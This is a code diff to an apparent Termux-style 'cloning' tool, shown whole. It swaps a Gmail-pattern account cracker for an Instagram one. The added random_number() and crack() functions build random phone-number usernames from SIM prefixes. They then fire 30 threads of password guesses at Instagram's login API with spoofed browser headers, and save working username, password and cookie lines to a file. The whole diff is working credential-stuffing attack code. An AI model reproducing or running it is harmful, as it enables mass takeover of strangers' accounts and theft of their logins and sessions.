@@ -568,7 +568,7 @@ def menu():
     print("[1] FILE   CLONING =>")
     print("[2] RANDOM CLONING =>")
     print("[3] PUBLIK CLONING =>")
-    print("[4] GMAIL  CLONING =>")
+    print("[4] INSGRAM CLONING =>")
     print("[5] CONTACT (WHATSAPP) ")
     print("[6] EXIT TOOL ")
     linex()
@@ -576,7 +576,7 @@ def menu():
     if bithi =='1':f_clone()
     elif bithi =='2':r_clone()
     elif bithi =='3':n_clone()
-    elif bithi =='4':g_clone()
+    elif bithi =='4':random_number()
     elif bithi =='5':os.system("xdg-open ");menu()
     elif bithi =='6':exit()
     else:
@@ -1042,69 +1042,42 @@ def n_clone():
     divider()
     exit()
 
-def g_clone():
-    user=[]
-    os.system('clear')
-    print(logo)
-    print(" Ex First : ayesha, kazim, SUMON ")
-    print(" Ex Last  : rajput, channa, aaraya ")
-    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    first = input(' [â¢] First Name : ')
-    last = input(' [â¢] Last Name  : ')
-    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    print(' Ex Domain : @gmail.com, @yahoo.com, @hotmail.com ')
-    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    domain = input(' [â¢] Domain : ')
+def random_number():
+    clear()
+    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Codes : \033[1;92m0310, 0320, 0330, 0340 ")
+    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Limit : \033[1;92m1000, 2000, 5000, 10000 ")
+    linex()
+    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Code  :\033[1;92m ")
     try:
-        limit = int(input(' [â¢] Crack Limit : '))
+        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit :\033[1;92m "))
     except ValueError:
         limit = 5000
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(4))
-        user.append(nmp)
-    clear()
-    print("                CHOOSE METHOD                       ")
-    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    print(" [1] METHOD (METHOD1) ")
-    print(" [2] METHOD (METHOD2) ")
-    print(" [3] METHOD (METHOD3) ")
-    print(" [4] METHOD (METHOD4) ")
-    print(" [5] METHOD (METHOD5) ")
-    print(" [6] METHOD (METHOD6) ")
+    for _ in range(limit):
+        x = "".join(random.choice(string.digits) for _ in range(6))
+        idz.append(x)
+    with ThreadPoolExecutor(max_workers=30) as XYZ:
+        clear()
+        total_idz = str(len(idz))
+        print(f"\033[1;96m KING IS ALWAYS KING")
+        print(f"\033[1;96m SOME RESPECT")
+        linex()
+        print(f' \033[1;32m(√) \033[1;37mTotal IDs  :\033[1;32m ',total_idz)
+        print(' \033[1;37m{\033[1;32m+\033[1;37m} \033[1;35mCHOICE SIM CODE : \033[1;32m'+code)
+        print(" \x1b[38;5;208m(!) \x1b[38;5;205mUse Flight Mode For Speed UP");print(' \033[1;33m[•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/XYZ')
+        linex()
+        for xyz in idz:
+            uid = code+xyz
+            pww = ['57273200',uid[:6],uid[:8],uid] 
+         #,uid[:6],uid[:8],uid,uid[2:],uid[4:]
+            XYZ.submit(crack, uid, pww, total_idz)
     linex()
-    SUMONfire = input("[+] [CHOOSE] :- ")
+    print(f" \033[1;97m[\033[1;92m!\033[1;97m] Process Completed ")
+    print(f" \033[1;97m[\033[1;92m•\033[1;97] Total Ok Accounts : \033[1;92m{str(len(oks))} ")
+    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Total Cp Accounts : \033[1;91m{str(len(cps))} ")
     linex()
-    print(" [?] Do You Want To Show Cookies : (Y/N) ")
-    linex()
-    c = input(" [?] Input : ")
-    if c in ["Y", "y"]:
-        cookie_show.append("yes")
-    else:
-        cookie_show.append("no")
-    with ThreadPool(max_workers=30) as SUMON_xd:
-        tl = str(len(user))
-        os.system("clear")
-        print(logo)
-        print(' [â¢] CRACKING STARTED ')
-        print(' [â¢] TOTAL ACCOUNT : \033[1;32m'+tl)
-        print(' [!] USE FLIGHT MODE FOR MORE IDZ ')
-        print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-        for love in user:
-            uid = first+'.'+last+'.'+love+domain
-            pwx = [first+last,first+' '+last,first+last+'12',last,first+love,first+'123',first+'1234',first+last+'12']
-            if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
-            elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
-            elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
-            elif SUMONfire =='4':SUMON_xd.submit(mobile,uid,pwx,tl)
-            elif SUMONfire =='5':SUMON_xd.submit(freeq,uid,pwx,tl)
-            elif SUMONfire =='6':SUMON_xd.submit(d,uid,pwx,tl)
-            else:
-                SUMON_xd.submit(p,uid,pwx,tl)
-    linex()
-    print('[â] CRACK PROCESS COMPLETE')
-    print('[â] TOTAL OK ACCOUNTS : '+str(len(oks)))
-    print('[â] ID SAVE SUMON-OK TXT')
-    linex()
+    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter To Back ")
+    menu()
+
 
 def freefb(uid, name, pwx, tl):
     global loop
@@ -2207,6 +2180,94 @@ def cracker(uid, pwx, tl):
         time.sleep(20)
     except Exception as error:
         #print({error})
+        pass
+
+def crack(uid, pww, total_idz):
+    global loop
+    global oks
+    global cps
+    x = random.choice(["\033[1;90m","\033[1;91m","\033[1;92m" ,"\x1b[38;5;208m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
+    sys.stdout.write(f"\r{x}[BITHIKA] {loop}/{total_idz} \033[1;92m{len(oks)}\033[1;97m/\033[1;91m{len(cps)} \033[1;97m[\033[1;93m{'{:.0%}'.format(loop/float(total_idz))}\033[1;97m] ")
+    sys.stdout.flush()
+    try:
+        for pw in pww:
+            session = requests.Session()
+            time_now = int(datetime.now().timestamp())
+            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
+            response = session.get('https://www.instagram.com/accounts/login/')
+            csrftoken = response.cookies.get('csrftoken')
+            cookies ={
+                'csrftoken': csrftoken,
+                'mid': 'ZsCYoAALAAGlcbYkVN23DYxQwevD',
+                'ig_did': 'E68CEB20-E5E7-4BF3-BE61-C5EF4084D93B',
+                'ig_nrcb': '1',
+                'datr': 'npjAZqX5wY3c_CtTDAvR0Ls3',
+                'ps_l': '1',
+                'ps_n': '1',
+                'wd': '885x773',}
+            data = {
+                "enc_password": enc_password,
+                'optIntoOneTap': 'false',
+                'queryParams': '{"hl":"en"}',
+                'trustedDeviceRecords': '{}',
+                'username': uid,}
+            headers = {
+                'authority': 'www.instagram.com',
+                'accept': '*/*',
+                'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5',
+                'content-type': 'application/x-www-form-urlencoded',
+                # 'cookie': 'csrftoken=4M2PbXXQYNEmDdxrQg01NL; mid=ZsCYoAALAAGlcbYkVN23DYxQwevD; ig_did=E68CEB20-E5E7-4BF3-BE61-C5EF4084D93B; ig_nrcb=1; datr=npjAZqX5wY3c_CtTDAvR0Ls3; ps_l=1; ps_n=1; wd=885x773',
+                'origin': 'https://www.instagram.com',
+                'priority': 'u=1, i',
+                'referer': 'https://www.instagram.com/accounts/login/?hl=en',
+                'sec-ch-prefers-color-scheme': 'dark',
+                'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+                'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-model': '""',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-ch-ua-platform-version': '"10.0.0"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
+                'x-asbd-id': '129477',
+                'x-csrftoken': csrftoken,
+                'x-ig-app-id': '936619743392459',
+                'x-ig-www-claim': '0',
+                'x-instagram-ajax': '1015820104',
+                'x-requested-with': 'XMLHttpRequest',}
+            login_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
+            response = requests.post(login_url, cookies=cookies, headers=headers, data=data)
+            session_cookies = response.cookies.get_dict()
+            if response.status_code == 200:
+                json_response = response.json()
+                if json_response.get('status') == 'ok':
+                   if json_response.get('authenticated') == True:
+                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
+                        print(f"\r\033[1;92m [cookie] {cookies}")
+                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
+                        oks.append(uid)
+                        return True
+                   elif json_response.get('auth_token'):
+                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
+                        print(f"\r\033[1;92m [cookie] {cookies}")
+                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
+                        oks.append(uid)
+                        return True
+                   elif 'sessionid' in session_cookies:
+                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
+                        print(f"\r\033[1;92m [cookie] {cookies}")
+                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
+                        oks.append(uid)
+                        return True
+            else:
+                #print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
+                continue
+        loop+=1
+    except ConnectionError:
+        time.sleep(10)
+    except:
         pass
 
 os.system("clear")
